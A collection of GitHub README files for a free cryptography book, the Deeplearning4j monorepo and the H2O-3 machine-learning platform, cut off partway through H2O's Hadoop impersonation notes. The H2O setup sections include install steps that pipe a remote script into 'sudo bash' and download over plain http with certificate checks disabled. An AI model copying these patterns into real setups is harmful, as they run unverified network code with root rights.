[{"repo":"\/nakov\/Practical-Cryptography-for-Developers-Book","language":"CSS","readme_contents":"# Welcome\n\n> **Warning**: this book is **not finished**! I am still working on some of the chapters. Once it is completed, I will publish it as PDF and EPUB. Be patient.\n\n[![Practical Cryptography for Developers - Free Book by Svetlin Nakov - front cover](.gitbook\/assets\/practical-cryptography-for-developers-book-nakov-front-cover.png)](https:\/\/cryptobook.nakov.com)\n\nA modern **practical book** about **cryptography for developers** with code examples, covering core concepts like: **hashes** \\(like SHA-3 and BLAKE2\\), **MAC codes** \\(like HMAC and GMAC\\), **key derivation functions** \\(like Scrypt, Argon2\\), **key agreement protocols** \\(like DHKE, ECDH\\), **symmetric ciphers** \\(like AES and ChaCha20, cipher block modes, authenticated encryption, AEAD, AES-GCM, ChaCha20-Poly1305\\), **asymmetric ciphers** and **public-key cryptosystems** \\(RSA, ECC, ECIES\\), **elliptic curve cryptography** \\(ECC, secp256k1, curve25519\\), **digital signatures** \\(ECDSA and EdDSA\\), **secure random numbers** \\(PRNG, CSRNG\\) and **quantum-safe cryptography**, along with crypto **libraries** and developer tools, with a lots of **code examples** in Python and other languages.\n\nAuthor: **Svetlin Nakov**, PhD - [http:\/\/www.nakov.com](http:\/\/www.nakov.com)\n\nContributors: Milen Stefanov, Marina Shideroff\n\nISBN: **978-619-00-0870-5** \\(9786190008705\\)\n\nThis book is free and open-source, published under the [**MIT license**](https:\/\/opensource.org\/licenses\/MIT).\n\nOfficial Web site: [https:\/\/cryptobook.nakov.com](https:\/\/cryptobook.nakov.com)\n\nOfficial **GitHub** repo: [https:\/\/github.com\/nakov\/practical-cryptography-for-developers-book](https:\/\/github.com\/nakov\/practical-cryptography-for-developers-book).\n\nSofia, November 2018\n\nTags: cryptography, free, book, Nakov, Svetlin Nakov, hashes, hash function, SHA-256, SHA3, BLAKE2, RIPEMD, MAC, message authentication code, HMAC, KDF, key derivation, key derivation function, PBKDF2, Scrypt, Bcrypt, Argon2, password hashing, random generator, pseudo-random numbers, CSPRNG, secure random generator, key exchange, key agreement, Diffie-Hellman, DHKE, ECDH, symmetric ciphers, asymmetric ciphers, public key cryptosystems, symmetric cryptography, AES, Rijndael, cipher block mode, AES-CTR, AES-GCM, ChaCha20-Poly1305, authenticated encryption, encryption scheme, public key cryptography, RSA, ECC, elliptic curves, secp256k1, curve25519, EC points, EC domain parameters, ECDH key agreement, asymmetric encryption scheme, hybrid encryption, ECIES, digital signature, RSA signature, DSA, ECDSA, EdDSA, ElGammal signature, Schnorr signature, quantum-safe cryptography, digital certificates, TLS, OAuth, multi-factor authentication, crypto libraries, Python cryptography, JavaScript cryptography, C\\# cryptography, Java cryptography, C++ cryptography, PHP cryptography.\n\n"},{"repo":"\/eclipse\/deeplearning4j","language":"Java","readme_contents":"# Monorepo of Deeplearning4j\n\nWelcome to the new monorepo of Deeplearning4j that contains the source code for all the following projects, in addition to the original repository of Deeplearning4j moved to [deeplearning4j](deeplearning4j):\n\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/libnd4j\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/nd4j\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/datavec\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/arbiter\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/nd4s\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/gym-java-client\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/rl4j\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/scalnet\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/pydl4j\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/jumpy\n * https:\/\/github.com\/eclipse\/deeplearning4j\/tree\/master\/pydatavec\n \n\nTo build everything, we can use commands like\n```\n.\/change-cuda-versions.sh x.x\n.\/change-scala-versions.sh 2.xx\n.\/change-spark-versions.sh x\nmvn clean install -Dmaven.test.skip -Dlibnd4j.cuda=x.x -Dlibnd4j.compute=xx\n```\nor\n```\nmvn -B -V -U clean install -pl '!jumpy,!pydatavec,!pydl4j' -Dlibnd4j.platform=linux-x86_64 -Dlibnd4j.chip=cuda -Dlibnd4j.cuda=9.2 -Dlibnd4j.compute=<your GPU CC> -Djavacpp.platform=linux-x86_64 -Dmaven.test.skip=true\n```\n\nAn example of GPU \"CC\" or compute capability is 61 for Titan X Pascal.\n\n# Want some examples?\nWe have separate repository with various examples available: https:\/\/github.com\/eclipse\/deeplearning4j-examples\n\nIn the examples repo, you'll also find a tutorial series in Zeppelin: https:\/\/github.com\/eclipse\/deeplearning4j-examples\/tree\/master\/tutorials\n"},{"repo":"\/h2oai\/h2o-3","language":"Java","readme_contents":"# H2O\n\n[![Join the chat at https:\/\/gitter.im\/h2oai\/h2o-3](https:\/\/badges.gitter.im\/Join%20Chat.svg)](https:\/\/gitter.im\/h2oai\/h2o-3?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\nH2O is an in-memory platform for distributed, scalable machine learning. H2O uses familiar interfaces like R, Python, Scala, Java, JSON and the Flow notebook\/web interface, and works seamlessly with big data technologies like Hadoop and Spark. H2O provides implementations of many popular algorithms such as [GBM](https:\/\/en.wikipedia.org\/wiki\/Gradient_boosting), [Random Forest](https:\/\/en.wikipedia.org\/wiki\/Random_forest), [Deep Neural Networks](https:\/\/en.wikipedia.org\/wiki\/Deep_neural_networks), [Word2Vec](https:\/\/en.wikipedia.org\/wiki\/Word2vec) and [Stacked Ensembles](https:\/\/en.wikipedia.org\/wiki\/Ensemble_learning).  H2O is extensible so that developers can add data transformations and custom algorithms of their choice and access them through all of those clients.  \n\nData collection is easy. Decision making is hard. H2O makes it fast and easy to derive insights from your data through faster and better predictive modeling. H2O allows online scoring and modeling in a single platform.\n\nH2O-3 (this repository) is the third incarnation of H2O, and the successor to [H2O-2](https:\/\/github.com\/h2oai\/h2o-2).  \n\n### Table of Contents\n\n* [Downloading H2O-3](#Downloading)\n* [Open Source Resources](#Resources)\n    * [Issue Tracking and Feature Requests](#IssueTracking)\n    * [List of H2O Resources](#OpenSourceResources)\n* [Using H2O-3 Code Artifacts (libraries)](#Artifacts)\n* [Building H2O-3](#Building)\n* [Launching H2O after Building](#Launching)\n* [Building H2O on Hadoop](#BuildingHadoop)\n* [Sparkling Water](#Sparkling)\n* [Documentation](#Documentation)\n* [Citing H2O](#Citing)\n* [Roadmap](#Roadmap)\n* [Community](#Community) \/ [Advisors](#Advisors) \/ [Investors](#Investors)\n\n<a name=\"Downloading\"><\/a>\n## 1. Downloading H2O-3\n\nWhile most of this README is written for developers who do their own builds, most H2O users just download and use a pre-built version.  If you are a Python or R user, the easiest way to install H2O is via [PyPI](https:\/\/pypi.python.org\/pypi\/h2o) or [Anaconda](https:\/\/anaconda.org\/h2oai\/h2o) (for Python) or [CRAN](https:\/\/CRAN.R-project.org\/package=h2o) (for R):  \n\n### Python\n\n```bash\npip install h2o\n```\n\n### R\n\n```r\ninstall.packages(\"h2o\")\n```\n\nFor the latest stable, nightly, Hadoop (or Spark \/ Sparkling Water) releases, or the stand-alone H2O jar, please visit: [https:\/\/h2o.ai\/download](https:\/\/h2o.ai\/download)\n\nMore info on downloading & installing H2O is available in the [H2O User Guide](http:\/\/docs.h2o.ai\/h2o\/latest-stable\/h2o-docs\/downloading.html).\n\n<a name=\"Resources\"><\/a>\n## 2. Open Source Resources\n\nMost people interact with three or four primary open source resources:  **GitHub** (which you've already found), **JIRA** (for bug reports and issue tracking), **Stack Overflow** for H2O code\/software-specific questions, and **h2ostream** (a Google Group \/ email discussion forum) for questions not suitable for Stack Overflow.  There is also a **Gitter** H2O developer chat group, however for archival purposes & to maximize accessibility, we'd prefer that standard H2O Q&A be conducted on Stack Overflow.\n\n<a name=\"IssueTracking\"><\/a>\n### 2.1 Issue Tracking and Feature Requests\n\n> (Note: There is only one issue tracking system for the project.  GitHub issues are not enabled; you must use JIRA.)\n\nYou can browse and create new issues in our open source **JIRA**:  <http:\/\/jira.h2o.ai>\n\n*  You can **browse** and search for **issues** without logging in to JIRA:\n    1.  Click the `Issues` menu\n    1.  Click `Search for issues`\n*  To **create** an **issue** (either a bug or a feature request), please create yourself an account first:\n    1.  Click the `Log In` button on the top right of the screen\n    1.  Click `Create an acccount` near the bottom of the login box\n    1.  Once you have created an account and logged in, use the `Create` button on the menu to create an issue\n    1.  Create H2O-3 issues in the [PUBDEV](https:\/\/0xdata.atlassian.net\/projects\/PUBDEV\/issues) project.  (Note: Sparkling Water questions should be filed under the [SW](https:\/\/0xdata.atlassian.net\/projects\/SW\/issues) project.)\n*\tYou can also vote for feature requests and\/or other issues. Voting can help H2O prioritize the features that are included in each release.\n\t1. Go to the [H2O JIRA page](https:\/\/0xdata.atlassian.net\/).\n\t2. Click **Log In** to either log in or create an account if you do not already have one.\n\t3. Search for the feature that you want to prioritize, or create a new feature.\n\t4. Click on the **Vote for this issue** link. This is located on the right side of the issue under the **People** section.\n\n<a name=\"OpenSourceResources\"><\/a>\n### 2.2 List of H2O Resources\n\n*  GitHub\n    * <https:\/\/github.com\/h2oai\/h2o-3>\n*  JIRA -- file bug reports \/ track issues here\n    * The [PUBDEV](https:\/\/0xdata.atlassian.net\/projects\/PUBDEV\/issues) project contains issues for the current H2O-3 project)\n*  Stack Overflow -- ask all code\/software questions here\n    * <http:\/\/stackoverflow.com\/questions\/tagged\/h2o>\n*  Cross Validated (Stack Exchange) -- ask algorithm\/theory questions here\n    * <https:\/\/stats.stackexchange.com\/questions\/tagged\/h2o>\n*  h2ostream Google Group -- ask non-code related questions here\n    * Web: <https:\/\/groups.google.com\/d\/forum\/h2ostream>\n    * Mail to: [h2ostream@googlegroups.com](mailto:h2ostream@googlegroups.com)\n* Gitter H2O Developer Chat\n    * <https:\/\/gitter.im\/h2oai\/h2o-3>    \n*  Documentation\n    * H2O User Guide (main docs): <http:\/\/docs.h2o.ai\/h2o\/latest-stable\/h2o-docs\/index.html>\n    * All H2O documenation links: <http:\/\/docs.h2o.ai>\n    * Nightly build page (nightly docs linked in page): <https:\/\/s3.amazonaws.com\/h2o-release\/h2o\/master\/latest.html>\n*  Download (pre-built packages)\n    * <http:\/\/h2o.ai\/download>\n*  Jenkins (H2O build and test system)\n    * <http:\/\/test.h2o.ai>\n*  Website\n    * <http:\/\/h2o.ai>\n*  Twitter -- follow us for updates and H2O news!\n    * <https:\/\/twitter.com\/h2oai>\n\n*  Awesome H2O -- share your H2O-powered creations with us\n   * <https:\/\/github.com\/h2oai\/awesome-h2o>\n\n\n<a name=\"Artifacts\"><\/a>\n## 3. Using H2O-3 Artifacts\n\nEvery nightly build publishes R, Python, Java, and Scala artifacts to a build-specific repository.  In particular, you can find Java artifacts in the maven\/repo directory.\n\nHere is an example snippet of a gradle build file using h2o-3 as a dependency.  Replace x, y, z, and nnnn with valid numbers.\n\n```\n\/\/ h2o-3 dependency information\ndef h2oBranch = 'master'\ndef h2oBuildNumber = 'nnnn'\ndef h2oProjectVersion = \"x.y.z.${h2oBuildNumber}\"\n\nrepositories {\n  \/\/ h2o-3 dependencies\n  maven {\n    url \"https:\/\/s3.amazonaws.com\/h2o-release\/h2o-3\/${h2oBranch}\/${h2oBuildNumber}\/maven\/repo\/\"\n  }\n}\n\ndependencies {\n  compile \"ai.h2o:h2o-core:${h2oProjectVersion}\"\n  compile \"ai.h2o:h2o-algos:${h2oProjectVersion}\"\n  compile \"ai.h2o:h2o-web:${h2oProjectVersion}\"\n  compile \"ai.h2o:h2o-app:${h2oProjectVersion}\"\n}\n```\n\nRefer to the latest H2O-3 bleeding edge [nightly build page](http:\/\/s3.amazonaws.com\/h2o-release\/h2o-3\/master\/latest.html) for information about installing nightly build artifacts.\n\nRefer to the [h2o-droplets GitHub repository](https:\/\/github.com\/h2oai\/h2o-droplets) for a working example of how to use Java artifacts with gradle.\n\n> Note: Stable H2O-3 artifacts are periodically published to Maven Central ([click here to search](http:\/\/search.maven.org\/#search%7Cga%7C1%7Cai.h2o)) but may substantially lag behind H2O-3 Bleeding Edge nightly builds.\n\n\n<a name=\"Building\"><\/a>\n## 4. Building H2O-3\n\nGetting started with H2O development requires [JDK 1.7](http:\/\/www.oracle.com\/technetwork\/java\/javase\/downloads\/), [Node.js](https:\/\/nodejs.org\/), [Gradle](https:\/\/gradle.org\/), [Python](https:\/\/www.python.org\/) and [R](http:\/\/www.r-project.org\/).  We use the Gradle wrapper (called `gradlew`) to ensure up-to-date local versions of Gradle and other dependencies are installed in your development directory.\n\n### 4.1. Before building\n\nBuilding `h2o` requires a properly set up R environment with [required packages](#InstallRPackagesInUnix) and Python environment with the following packages:\n\n```\ngrip\ncolorama\nfuture\ntabulate\nrequests\nwheel\n```\n\nTo install these packages you can use [pip](https:\/\/pip.pypa.io\/en\/stable\/installing\/) or [conda](https:\/\/conda.io\/).\nIf you have troubles installing these packages on *Windows*, please follow section [Setup on Windows](#SetupWin) of this guide.\n> (Note: It is recommended to use some virtual environment such as [VirtualEnv](https:\/\/virtualenv.pypa.io\/), to install all packages. )\n\n\n### 4.2. Building from the command line (Quick Start)\n\nTo build H2O from the repository, perform the following steps.\n\n\n#### Recipe 1: Clone fresh, build, skip tests, and run H2O\n\n```\n# Build H2O\ngit clone https:\/\/github.com\/h2oai\/h2o-3.git\ncd h2o-3\n.\/gradlew build -x test\n\nYou may encounter problems: e.g. npm missing. Install it:\nbrew install npm\n\n# Start H2O\njava -jar build\/h2o.jar\n\n# Point browser to http:\/\/localhost:54321\n\n```\n\n#### Recipe 2: Clone fresh, build, and run tests (requires a working install of R)\n\n```\ngit clone https:\/\/github.com\/h2oai\/h2o-3.git\ncd h2o-3\n.\/gradlew syncSmalldata\n.\/gradlew syncRPackages\n.\/gradlew build\n```\n\n>**Notes**:\n>\n> - Running tests starts five test JVMs that form an H2O cluster and requires at least 8GB of RAM (preferably 16GB of RAM).\n> - Running `.\/gradlew syncRPackages` is supported on Windows, OS X, and Linux, and is strongly recommended but not required. `.\/gradlew syncRPackages` ensures a complete and consistent environment with pre-approved versions of the packages required for tests and builds. The packages can be installed manually, but we recommend setting an ENV variable and using `.\/gradlew syncRPackages`. To set the ENV variable, use the following format (where `${WORKSPACE} can be any path):\n>  \n> ```\n> mkdir -p ${WORKSPACE}\/Rlibrary\n> export R_LIBS_USER=${WORKSPACE}\/Rlibrary\n> ```\n\n#### Recipe 3:  Pull, clean, build, and run tests\n\n```\ngit pull\n.\/gradlew syncSmalldata\n.\/gradlew syncRPackages\n.\/gradlew clean\n.\/gradlew build\n```\n\n#### Notes\n\n - We recommend using `.\/gradlew clean` after each `git pull`.\n\n- Skip tests by adding `-x test` at the end the gradle build command line.  Tests typically run for 7-10 minutes on a Macbook Pro laptop with 4 CPUs (8 hyperthreads) and 16 GB of RAM.\n\n- Syncing smalldata is not required after each pull, but if tests fail due to missing data files, then try `.\/gradlew syncSmalldata` as the first troubleshooting step.  Syncing smalldata downloads data files from AWS S3 to the smalldata directory in your workspace.  The sync is incremental.  Do not check in these files.  The smalldata directory is in .gitignore.  If you do not run any tests, you do not need the smalldata directory.\n- Running `.\/gradlew syncRPackages` is supported on Windows, OS X, and Linux, and is strongly recommended but not required. `.\/gradlew syncRPackages` ensures a complete and consistent environment with pre-approved versions of the packages required for tests and builds. The packages can be installed manually, but we recommend setting an ENV variable and using `.\/gradlew syncRPackages`. To set the ENV variable, use the following format (where `${WORKSPACE}` can be any path):\n\n  ```\n  mkdir -p ${WORKSPACE}\/Rlibrary\n  export R_LIBS_USER=${WORKSPACE}\/Rlibrary\n  ```\n\n#### Recipe 4:  Just building the docs\n\n```\n.\/gradlew clean && .\/gradlew build -x test && (export DO_FAST=1; .\/gradlew dist)\nopen target\/docs-website\/h2o-docs\/index.html\n```\n\n<a name=\"SetupWin\"><\/a>\n### 4.3. Setup on Windows\n\n##### Step 1: Download and install [WinPython](https:\/\/winpython.github.io).\n  From the command line, validate `python` is using the newly installed package by using `which python` (or `sudo which python`). [Update the Environment variable](https:\/\/github.com\/winpython\/winpython\/wiki\/Environment) with the WinPython path.\n\n##### Step 2: Install required Python packages:\n\n    pip install grip 'colorama>=0.3.8' future tabulate wheel\n\n##### Step 3: Install JDK\n\nInstall [Java 1.7](http:\/\/www.oracle.com\/technetwork\/java\/javase\/downloads\/jdk7-downloads-1880260.html) and add the appropriate directory `C:\\Program Files\\Java\\jdk1.7.0_65\\bin` with java.exe to PATH in Environment Variables. To make sure the command prompt is detecting the correct Java version, run:\n\n    javac -version\n\nThe CLASSPATH variable also needs to be set to the lib subfolder of the JDK:\n\n    CLASSPATH=\/<path>\/<to>\/<jdk>\/lib\n\n##### Step 4. Install Node.js\n\nInstall [Node.js](http:\/\/nodejs.org\/download\/) and add the installed directory `C:\\Program Files\\nodejs`, which must include node.exe and npm.cmd to PATH if not already prepended.\n\n##### Step 5. Install R, the required packages, and Rtools:\n\nInstall [R](http:\/\/www.r-project.org\/) and add the bin directory to your PATH if not already included.\n\n<a name=\"InstallRPackagesInUnix\"><\/a>\nInstall the following R packages:\n\n- [RCurl](http:\/\/cran.r-project.org\/package=RCurl)\n- [jsonlite](http:\/\/cran.r-project.org\/package=jsonlite)\n- [statmod](http:\/\/cran.r-project.org\/package=statmod)\n- [devtools](http:\/\/cran.r-project.org\/package=devtools)\n- [roxygen2](http:\/\/cran.r-project.org\/package=roxygen2)\n- [testthat](http:\/\/cran.r-project.org\/package=testthat)\n\nTo install these packages from within an R session:\n\n```r\npkgs <- c(\"RCurl\", \"jsonlite\", \"statmod\", \"devtools\", \"roxygen2\", \"testthat\")\nfor (pkg in pkgs) {\n  if (! (pkg %in% rownames(installed.packages()))) install.packages(pkg)\n}\n```\nNote that [libcurl](http:\/\/curl.haxx.se) is required for installation of the **RCurl** R package.\n\nFinally, install [Rtools](http:\/\/cran.r-project.org\/bin\/windows\/Rtools\/), which is a collection of command line tools to facilitate R development on Windows.\n>**NOTE**: During Rtools installation, do **not** install Cygwin.dll.\n\n##### Step 6. Install [Cygwin](https:\/\/cygwin.com\/setup-x86_64.exe)\n**NOTE**: During installation of Cygwin, deselect the Python packages to avoid a conflict with the Python.org package.\n\n###### Step 6b. Validate Cygwin\nIf Cygwin is already installed, remove the Python packages or ensure that Native Python is before Cygwin in the PATH variable.\n\n##### Step 7. Update or validate the Windows PATH variable to include R, Java JDK, Cygwin.\n\n##### Step 8. Git Clone [h2o-3](https:\/\/github.com\/h2oai\/h2o-3.git)\n\nIf you don't already have a Git client, please install one.  The default one can be found here http:\/\/git-scm.com\/downloads.  Make sure that command prompt support is enabled before the installation.\n\nDownload and update h2o-3 source codes:\n\n    git clone https:\/\/github.com\/h2oai\/h2o-3\n\n##### Step 9. Run the top-level gradle build:\n\n    cd h2o-3\n    .\/gradlew.bat build\n\n> If you encounter errors run again with `--stacktrace` for more instructions on missing dependencies.\n\n\n### 4.4. Setup on OS X\n\nIf you don't have [Homebrew](http:\/\/brew.sh\/), we recommend installing it.  It makes package management for OS X easy.\n\n##### Step 1. Install JDK\n\nInstall [Java 1.7](http:\/\/www.oracle.com\/technetwork\/java\/javase\/downloads\/jdk7-downloads-1880260.html). To make sure the command prompt is detecting the correct Java version, run:\n\n    javac -version\n\n##### Step 2. Install Node.js:\n\nUsing Homebrew:\n\n    brew install node\n\nOtherwise, install from the [NodeJS website](http:\/\/nodejs.org\/download\/).\n\n##### Step 3. Install R and the required packages:\n\nInstall [R](http:\/\/www.r-project.org\/) and add the bin directory to your PATH if not already included.\n\n<a name=\"InstallRPackagesInUnix\"><\/a>\nInstall the following R packages:\n\n- [RCurl](http:\/\/cran.r-project.org\/package=RCurl)\n- [jsonlite](http:\/\/cran.r-project.org\/package=jsonlite)\n- [statmod](http:\/\/cran.r-project.org\/package=statmod)\n- [devtools](http:\/\/cran.r-project.org\/package=devtools)\n- [roxygen2](http:\/\/cran.r-project.org\/package=roxygen2)\n- [testthat](http:\/\/cran.r-project.org\/package=testthat)\n\nTo install these packages from within an R session:\n\n```r\npkgs <- c(\"RCurl\", \"jsonlite\", \"statmod\", \"devtools\", \"roxygen2\", \"testthat\")\nfor (pkg in pkgs) {\n  if (! (pkg %in% rownames(installed.packages()))) install.packages(pkg)\n}\n```\nNote that [libcurl](http:\/\/curl.haxx.se) is required for installation of the **RCurl** R package.\n\n##### Step 4. Install python and the required packages:\n\nInstall python:\n\n    brew install python\n\nInstall pip package manager:\n\n    sudo easy_install pip\n\nNext install required pakcages:\n\n    sudo pip install wheel requests 'colorama>=0.3.8' future tabulate  \n\n##### Step 5. Git Clone [h2o-3](https:\/\/github.com\/h2oai\/h2o-3.git)\n\nOS X should already have Git installed. To download and update h2o-3 source codes:\n\n    git clone https:\/\/github.com\/h2oai\/h2o-3\n\n##### Step 6. Run the top-level gradle build:\n\n    cd h2o-3\n    .\/gradlew build\n\nNote: on a regular machine it may take very long time (about an hour) to run all the tests.\n\n> If you encounter errors run again with `--stacktrace` for more instructions on missing dependencies.\n\n### 4.5. Setup on Ubuntu 14.04\n\n##### Step 1. Install Node.js\n\n    curl -sL https:\/\/deb.nodesource.com\/setup_0.12 | sudo bash -\n    sudo apt-get install -y nodejs\n\n##### Step 2. Install JDK:\n\nInstall [Java 8](https:\/\/www.oracle.com\/technetwork\/java\/javase\/downloads\/jdk8-downloads-2133151.html). Installation instructions can be found here [JDK installation](http:\/\/askubuntu.com\/questions\/56104\/how-can-i-install-sun-oracles-proprietary-java-jdk-6-7-8-or-jre). To make sure the command prompt is detecting the correct Java version, run:\n\n    javac -version\n\n##### Step 3. Install R and the required packages:\n\nInstallation instructions can be found here [R installation](http:\/\/cran.r-project.org).  Click \u201cDownload R for Linux\u201d.  Click \u201cubuntu\u201d.  Follow the given instructions.\n\nTo install the required packages, follow the [same instructions as for OS X above](#InstallRPackagesInUnix).\n\n>**Note**: If the process fails to install RStudio Server on Linux, run one of the following:\n>\n>`sudo apt-get install libcurl4-openssl-dev`\n>\n>or\n>\n>`sudo apt-get install libcurl4-gnutls-dev`\n\n##### Step 4. Git Clone [h2o-3](https:\/\/github.com\/h2oai\/h2o-3.git)\n\nIf you don't already have a Git client:\n\n    sudo apt-get install git\n\nDownload and update h2o-3 source codes:\n\n    git clone https:\/\/github.com\/h2oai\/h2o-3\n\n##### Step 5. Run the top-level gradle build:\n\n    cd h2o-3\n    .\/gradlew build\n\n> If you encounter errors, run again using `--stacktrace` for more instructions on missing dependencies.\n\n> Make sure that you are not running as root, since `bower` will reject such a run.\n\n### 4.6. Setup on Ubuntu 13.10\n\n##### Step 1. Install Node.js\n\n    curl -sL https:\/\/deb.nodesource.com\/setup_10.x | sudo bash -\n    sudo apt-get install -y nodejs\n\n##### Steps 2-4. Follow steps 2-4 for Ubuntu 14.04 (above)\n\n### 4.7. Setup on CentOS 7\n\n```\ncd \/opt\nsudo wget --no-cookies --no-check-certificate --header \"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie\" \"http:\/\/download.oracle.com\/otn-pub\/java\/jdk\/7u79-b15\/jdk-7u79-linux-x64.tar.gz\"\n\nsudo tar xzf jdk-7u79-linux-x64.tar.gz\ncd jdk1.7.0_79\n\nsudo alternatives --install \/usr\/bin\/java java \/opt\/jdk1.7.0_79\/bin\/java 2\n\nsudo alternatives --install \/usr\/bin\/jar jar \/opt\/jdk1.7.0_79\/bin\/jar 2\nsudo alternatives --install \/usr\/bin\/javac javac \/opt\/jdk1.7.0_79\/bin\/javac 2\nsudo alternatives --set jar \/opt\/jdk1.7.0_79\/bin\/jar\nsudo alternatives --set javac \/opt\/jdk1.7.0_79\/bin\/javac\n\ncd \/opt\n\nsudo wget http:\/\/dl.fedoraproject.org\/pub\/epel\/7\/x86_64\/e\/epel-release-7-5.noarch.rpm\nsudo rpm -ivh epel-release-7-5.noarch.rpm\n\nsudo echo \"multilib_policy=best\" >> \/etc\/yum.conf\nsudo yum -y update\n\nsudo yum -y install R R-devel git python-pip openssl-devel libxml2-devel libcurl-devel gcc gcc-c++ make openssl-devel kernel-devel texlive texinfo texlive-latex-fonts libX11-devel mesa-libGL-devel mesa-libGL nodejs npm python-devel numpy scipy python-pandas\n\nsudo pip install scikit-learn grip tabulate statsmodels wheel\n\nmkdir ~\/Rlibrary\nexport JAVA_HOME=\/opt\/jdk1.7.0_79\nexport JRE_HOME=\/opt\/jdk1.7.0_79\/jre\nexport PATH=$PATH:\/opt\/jdk1.7.0_79\/bin:\/opt\/jdk1.7.0_79\/jre\/bin\nexport R_LIBS_USER=~\/Rlibrary\n\n# install local R packages\nR -e 'install.packages(c(\"RCurl\",\"jsonlite\",\"statmod\",\"devtools\",\"roxygen2\",\"testthat\"), dependencies=TRUE, repos=\"http:\/\/cran.rstudio.com\/\")'\n\ncd\ngit clone https:\/\/github.com\/h2oai\/h2o-3.git\ncd h2o-3\n\n# Build H2O\n.\/gradlew syncSmalldata\n.\/gradlew syncRPackages\n.\/gradlew build -x test\n\n```\n\n\n<a name=\"Launching\"><\/a>\n### 4.8. Setting up your preferred IDE environment\n\nFor users of Intellij's IDEA, generate project files with:\n\n    .\/gradlew idea\n\nFor users of Eclipse, generate project files with:\n\n    .\/gradlew eclipse\n\n\n\n## 5. Launching H2O after Building\n\nTo start the H2O cluster locally, execute the following on the command line:\n\n    java -jar build\/h2o.jar\n\nA list of available start-up JVM and H2O options (e.g. `-Xmx`, `-nthreads`, `-ip`), is available in the [H2O User Guide](http:\/\/docs.h2o.ai\/h2o\/latest-stable\/h2o-docs\/starting-h2o.html#from-the-command-line).\n\n<a name=\"BuildingHadoop\"><\/a>\n## 6. Building H2O on Hadoop\n\nPre-built H2O-on-Hadoop zip files are available on the [download page](http:\/\/h2o.ai\/download).  Each Hadoop distribution version has a separate zip file in h2o-3.\n\nTo build H2O with Hadoop support yourself, first install sphinx for python: `pip install sphinx`\nThen start the build by entering  the following from the top-level h2o-3 directory:\n\n    (export BUILD_HADOOP=1; .\/gradlew build -x test)\n    .\/gradlew dist\n\nThis will create a directory called 'target' and generate zip files there.  Note that `BUILD_HADOOP` is the default behavior when the username is `jenkins` (refer to `settings.gradle`); otherwise you have to request it, as shown above.\n\n\n### Adding support for a new version of Hadoop\n\nIn the `h2o-hadoop` directory, each Hadoop version has a build directory for the driver and an assembly directory for the fatjar.\n\nYou need to:\n\n1.  Add a new driver directory and assembly directory (each with a `build.gradle` file) in `h2o-hadoop`\n2.  Add these new projects to `h2o-3\/settings.gradle`\n3.  Add the new Hadoop version to `HADOOP_VERSIONS` in `make-dist.sh`\n4.  Add the new Hadoop version to the list in `h2o-dist\/buildinfo.json`\n\n\n### Secure user impersonation\n\nHadoop supports [secure user impersonation](https:\/\/hadoop.apache.org\/docs\/r2.7.3\/hadoop-project-dist\/hadoop-common\/Superusers.html) through its Java API.  A kerberos-authenticated user can be allowed to proxy any username that meets specified criteria entered in the NameNode's core-site.xml file.  This impersonation only applies to interactions with the Hadoop API or the APIs of Hadoop-related services that support it (this is not the same as switching to that user on the machine of origin).\n\nSetting up secure user impersonation (for h2o):\n\n1.  Create or find an id to use as proxy which has limited-to-no access to HDFS or related services; the proxy user need only be used to impersonate a user\n2.  (Required if not using h2odriver) If you are not using the driver (e.g. you wrote your own code against h2o's API using Hadoop), make the necessary code changes to impersonate users (see [org.apache.hadoop.security.UserGroupInformation](http:\/\/hadoop.apache.org\/docs\/r2.8.0\/api\/org\/apache\/hadoop\/security\/UserGroupInformation.html))\n3.  In either of Ambari\/Cloudera Manager or directly on the NameNode's core-site.xml file, add 2\/3 properties for the user we wish to use as a proxy (replace <proxyusername> with the simple user name - not the fully-qualified principal name).\n    * `hadoop.proxyuser.<proxyusername>.hosts`: the hosts the proxy user is allowed to perform impersonated actions on behalf of a valid user from\n    * `hadoop.proxyuser.<proxyusername>.groups`: the groups an impersonated user must belong to for impersonation to work with that proxy user\n    * `hadoop.proxyuser.<proxyusername>.users`: the users a proxy user is allowed to impersonate\n    * Example: ```\n               <property>\n                 <name>hadoop.proxyuser.myproxyuser.hosts<\/name>\n                 <value>host1,host2<\/value>\n               <\/property>\n               <property>\n                 <name>hadoop.proxyuser.myproxyuser.groups<\/name>\n                 <value>group1,group2<\/value>\n               <\/property>\n               <property>\n                 <name>hadoop.proxyuser.myproxyuser.users<\/name>\n                 <value>user1,user2<\/value>\n               <\/property>\n               ```\n4.  Restart core services such as HDFS & YARN for the changes to take effect\n\nImpersonated HDFS actions can be viewed in the hdfs audit log ('auth:PROXY' should appear in the `ugi=` field in entries where this is applicable).  YARN similarly should show 'auth:PROXY' somewhere in the Resource Manager UI.\n\n\nTo use secure impersonation with h2o's Hadoop driver:\n\n*Before this is attempted, see Risks with impersonation, below*\n\nWhen using the h2odriver (e.g. when running with `hadoop jar ...`), specify `-principal <proxy user kerberos principal>`, `-keytab <proxy user keytab path>`, and `-run_as_user <hadoop username to impersonate>`, in addition to any other arguments needed.  If the configuration was successful, the proxy user will log in and impersonate the `-run_as_user` as long as that user is allowed by either the users or groups configuration property (configured above); this is enforced by HDFS & YARN, not h2o's code.  The driver effectively sets its security context as the impersonated user so all supported Hadoop actions will be performed as that user (e.g. YARN, HDFS APIs support securely impersonated users, but others may not).\n\n#### Precautions to take when leveraging secure impersonation\n\n*  The target use case for secure impersonation is applications or services that pre-authenticate a user and then use (in this case) the h2odriver on behalf of that user.  H2O's Steam is a perfect example: auth user in web app over SSL, impersonate that user when creating the h2o YARN container.\n*  The proxy user should have limited permissions in the Hadoop cluster; this means no permissions to access data or make API calls.  In this way, if it's compromised it would only have the power to impersonate a specific subset of the users in the cluster and only from specific machines.\n*  Use the 